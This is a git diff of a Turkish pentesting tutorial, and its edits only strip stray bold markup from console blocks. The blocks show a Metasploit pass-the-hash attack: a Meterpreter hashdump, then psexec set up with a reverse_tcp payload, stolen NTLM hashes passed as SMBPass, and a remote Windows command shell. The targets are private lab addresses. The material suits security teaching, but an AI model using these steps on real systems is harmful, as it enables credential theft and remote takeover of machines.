@@ -58,7 +58,7 @@ Aşağıda, bir exploit kullanılarak Meterpreter oturumu açılmıştır ve `po
 
 
 ```bash
-> Meterpreter session 1 opened **(**192.168.57.133:443 -> 192.168.57.131:1042**)**
+> Meterpreter session 1 opened (192.168.57.133:443 -> 192.168.57.131:1042)
 
 meterpreter > run post/windows/gather/hashdump 
 
@@ -103,7 +103,7 @@ root@kali:~# msfconsole
        **=[** metasploit v4.2.0-dev **[**core:4.2 api:1.0]
 + -- --**=[** 787 exploits - 425 auxiliary - 128 post
 + -- --**=[** 238 payloads - 27 encoders - 8 nops
-       **=[** svn r14551 updated yesterday **(**2012.01.14**)**
+       **=[** svn r14551 updated yesterday (2012.01.14)
 
 msf > search psexec
 
@@ -116,15 +116,15 @@ Exploits
    windows/smb/smb_relay      Microsoft Windows SMB Relay Code Execution
 
 msf > use exploit/windows/smb/psexec
-msf exploit**(**psexec**)** > set payload windows/meterpreter/reverse_tcp
-payload **=>** windows/meterpreter/reverse_tcp
-msf exploit**(**psexec**)** > set LHOST 192.168.57.133
-LHOST **=>** 192.168.57.133
-msf exploit**(**psexec**)** > set LPORT 443
-LPORT **=>** 443
-msf exploit**(**psexec**)** > set RHOST 192.168.57.140
-RHOST **=>** 192.168.57.140
-msf exploit**(**psexec**)** > show options
+msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf exploit(psexec) > set LHOST 192.168.57.133
+LHOST => 192.168.57.133
+msf exploit(psexec) > set LPORT 443
+LPORT => 443
+msf exploit(psexec) > set RHOST 192.168.57.140
+RHOST => 192.168.57.140
+msf exploit(psexec) > show options
 
 Module options:
 
@@ -132,11 +132,11 @@ Module options:
    ----     ---------------  --------  -----------
    RHOST    192.168.57.140   yes       The target address
    RPORT    445              yes       Set the SMB service port
-   SMBPass                   no        The password **for **the specified username
+   SMBPass                   no        The password for the specified username
    SMBUser  Administrator    yes       The username to authenticate as
 
 
-Payload options **(**windows/meterpreter/reverse_tcp**)**:
+Payload options (windows/meterpreter/reverse_tcp):
 
    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
@@ -161,9 +161,9 @@ Yukarıda görüldüğü gibi `exploit/windows/smb/psexec` modülünde `SMBPass`
 
 
 ```bash
-msf exploit**(**psexec**)** > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
-SMBPass **=>** e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
-msf exploit**(**psexec**)** > exploit
+msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
+SMBPass => e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
+msf exploit(psexec) > exploit
 
 > Connecting to the server...
 > Started reverse handler
@@ -173,21 +173,21 @@ msf exploit**(**psexec**)** > exploit
 > Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.57.140[\svcctl] ...
 > Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.57.140[\svcctl] ...
 > Obtaining a service manager handle...
-> Creating a new service **(**XKqtKinn - "MSSeYtOQydnRPWl"**)**...
+> Creating a new service (XKqtKinn - "MSSeYtOQydnRPWl")...
 > Closing service handle...
 > Opening service...
 > Starting the service...
 > Removing the service...
 > Closing service handle...
 > Deleting \KoVCxCjx.exe...
-> Sending stage **(**719360 bytes**)**
-> Meterpreter session 1 opened **(**192.168.57.133:443 -> 192.168.57.140:445**)**
+> Sending stage (719360 bytes)
+> Meterpreter session 1 opened (192.168.57.133:443 -> 192.168.57.140:445)
 
 meterpreter > shell
 Process 3680 created.
 Channel 1 created.
 Microsoft Windows **[**Version 5.2.3790]
-**(**C**)** Copyright 1985-2003 Microsoft Corp.
+(C) Copyright 1985-2003 Microsoft Corp.
 
 C:\WINDOWS\system32>
 ```
